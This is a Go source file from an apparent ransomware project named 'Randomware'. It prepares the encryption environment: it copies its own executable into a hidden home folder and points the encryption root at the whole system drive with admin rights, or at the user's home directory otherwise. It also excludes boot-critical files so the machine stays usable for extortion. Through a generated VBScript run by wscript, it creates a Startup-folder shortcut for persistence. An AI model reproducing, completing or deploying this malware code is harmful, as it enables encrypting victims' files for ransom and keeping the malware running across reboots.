package environment

import (
	"Randomware/file"
	"bytes"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
)

// Setup : setups all necessary environment files and variables
func Setup(isAdmin bool) {
	SetupSafeFiles(isAdmin)
	exePath, err := os.Executable()

	if err != nil {
		log.Fatal(err)
	}
	src, _ := os.Open(exePath)
	defer src.Close()

	dst, _ := os.Create(ExePath)

	defer dst.Close()
	io.Copy(dst, src)

	if !isAdmin {
		CreateShortcut("Random", ExePath, "-c", filepath.Dir(ExePath), "Startup")
	}
}

// SetupSafeAdminFiles : setups enviroments path using admin rights
func SetupSafeAdminFiles(exePath string) {
	EncryptionRootPath = os.Getenv("SystemDrive") + "\\"
	ExePath = os.Getenv("SystemDrive") + HomeFolder + "\\" + filepath.Base(exePath)

	HomePath = EncryptionRootPath + HomeFolder
}

// SetupSafeUserFiles : setups enviroments path using user rights
func SetupSafeUserFiles(exePath string) {
	user, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	UserPath = user.HomeDir

	EncryptionRootPath = UserPath

	ExePath = UserPath + "\\" + HomeFolder + "\\" + filepath.Base(exePath)

	HomePath = UserPath + "\\" + HomeFolder
}

// SetupSafeFiles : setups enviroments path using either user or admin rights
func SetupSafeFiles(isAdmin bool) error {

	exePath, err := os.Executable()

	if err != nil {
		return err
	}

	if isAdmin {
		SetupSafeAdminFiles(exePath)
		file.SafeFiles = []string{EncryptionRootPath + "Windows", EncryptionRootPath + "bootmgr", EncryptionRootPath + "BOOTNXT", EncryptionRootPath + "DumpStack.log.tmp", EncryptionRootPath + "pagefile.sys", EncryptionRootPath + "swapfile.sys", EncryptionRootPath + "Recovery", EncryptionRootPath + "System Volume Information", EncryptionRootPath + "sharefolder"}
	} else {
		SetupSafeUserFiles(exePath)
		file.SafeFiles = []string{UserPath + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Random.lnk"}
	}

	hostname, err := os.Hostname()

	if err != nil {
		hostname = ".BAD-PC"
	} else {
		hostname = "." + hostname
	}

	file.HostName = hostname

	_, err = os.Stat(HomePath)
	if os.IsNotExist(err) {
		os.Mkdir(HomePath, 0755)
	}

	exeDir := filepath.Dir(ExePath) + "\\"
	file.SafeFiles = append(file.SafeFiles, ExePath, exeDir+PubKeyFile, exeDir+PrivKeyFile, exeDir+EncryptedKeyFile)

	return nil
}

// CreateShortcut : creates a shortcut file
func CreateShortcut(linkName string, target string, arguments string, directory string, destination string) error {
	var scriptTxt bytes.Buffer
	scriptTxt.WriteString("Set oWS = CreateObject(\"WScript.Shell\")\n")
	scriptTxt.WriteString("strDesktopPath = oWS.SpecialFolders(\"" + destination + "\")\n")
	scriptTxt.WriteString("Set oLink = oWS.CreateShortcut(strDesktopPath & \"\\" + linkName + ".lnk\")\n")
	scriptTxt.WriteString("oLink.TargetPath = \"" + target + "\"\n")
	scriptTxt.WriteString("oLink.Arguments = \"" + arguments + "\"\n")
	scriptTxt.WriteString("oLink.WindowStyle = \"1\"\n")
	scriptTxt.WriteString("oLink.WorkingDirectory = \"" + directory + "\"\n")
	scriptTxt.WriteString("oLink.Save\n")
	filename := "lnkToBaby.vbs"
	ioutil.WriteFile(filename, scriptTxt.Bytes(), 0777)
	cmd := exec.Command("wscript", filename)
	err := cmd.Run()
	if err != nil {
		return err
	}
	cmd.Wait()
	os.Remove(filename)
	return nil
}
